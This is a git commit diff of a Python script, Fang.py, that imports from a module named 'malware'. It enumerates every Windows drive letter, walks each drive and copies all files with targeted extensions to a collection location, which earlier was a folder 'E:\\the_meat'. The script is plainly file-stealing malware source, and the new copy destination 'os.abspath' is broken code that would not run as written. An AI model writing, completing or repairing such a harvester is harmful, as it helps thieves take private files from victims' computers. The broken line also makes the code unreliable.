b3a3e7396fdc963a8f182485d0fc0c5d36135955
C4piti44 <97689075+C4piti44@users.noreply.github.com>
2022-02-01 23:47:48 +0200

    Update Fang.py
    change 2

--- Fang.py
+++ Fang.py
@@ -2,18 +2,25 @@ import shutil
 from malware import *
 import os
 from itertools import chain
+from string import ascii_uppercase
 
-# can change depend if it Mac ,Windows or Linux
-drivers = (r'D:\\', r'C:\\')
+#this function returns all of the drivers the computer has.
+#not sure if its working.
+def get_drivers():
+    list=[]
+    for letter in ascii_uppercase:
+        if (os.path.exists(letter+r':\\')):
+            list.append(letter+r':\\')
+    return list
+
+
+drivers = get_drivers()
 for dirpath, dirname, filenames in chain.from_iterable(os.walk(driver) for driver in drivers):
     for file in filenames:
         if any(file.endswith(extension) for extension in ex_list):
             try:
-                shutil.copy(os.path.join(dirpath, file), r'E:\the_meat')
+                shutil.copy(os.path.join(dirpath, file), os.abspath)
             except PermissionError:
                 pass
             except FileNotFoundError:
                 pass
-
-
-
